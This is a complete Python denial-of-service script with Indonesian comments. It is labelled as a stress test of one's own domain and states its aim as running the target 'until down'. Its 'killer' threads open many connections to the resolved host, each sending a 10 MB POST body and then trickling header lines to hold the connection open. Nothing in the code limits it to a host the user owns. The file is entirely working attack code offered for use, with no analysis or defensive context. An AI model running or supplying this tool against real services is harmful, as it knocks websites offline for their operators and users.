#!/usr/bin/env python3
# own_dos_domain.py – stress-test sampai down via hostname
# python3 own_dos_domain.py <your_domain> <port> <threads> <duration_sec>

import socket, threading, time, sys, dns.resolver

if len(sys.argv) != 5:
    print("Usage: python3 own_dos_domain.py <your_domain> <port> <threads> <duration_sec>")
    sys.exit(1)

DOMAIN = sys.argv[1]
PORT   = int(sys.argv[2])
THREADS = int(sys.argv[3])
DURATION = int(sys.argv[4])

# --- Resolve sekali ---
try:
    ip = str(dns.resolver.resolve(DOMAIN, 'A')[0])
except Exception as e:
    print("[!] DNS gagal:", e)
    sys.exit(1)

print(f"[+] {DOMAIN} → {ip}")

# --- Payload POST 10 MB ---
BODY = "x=" + "A" * (10 * 1024 * 1024)
REQ = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {DOMAIN}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(BODY)}\r\n"
    f"Connection: keep-alive\r\n\r\n"
    f"{BODY}"
).encode()

def killer():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, PORT))
            s.sendall(REQ)
            while True:
                s.send(b"X: a\r\n")
                time.sleep(0.5)
        except:
            pass

start = time.time()
for _ in range(THREADS):
    threading.Thread(target=killer, daemon=True).start()

while time.time() - start < DURATION:
    time.sleep(1)

print("[+] Test selesai.")